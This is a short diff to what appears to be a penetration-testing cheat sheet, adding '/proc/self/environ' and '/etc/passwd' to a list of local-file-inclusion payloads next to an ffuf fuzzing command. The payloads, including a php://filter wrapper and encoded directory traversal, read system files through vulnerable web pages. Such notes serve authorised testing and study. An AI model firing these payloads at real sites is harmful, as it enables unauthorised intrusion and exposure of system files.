@@ -194,6 +194,8 @@ ffuf -u 'http://$TARGET/nav.php?page=FUZZ' -t 30 -rate 300 -v -mc 200 \
 -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 
 [*] LFI
+/proc/self/environ
+/etc/passwd
 index.php?page=php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd
 ..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
 ..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
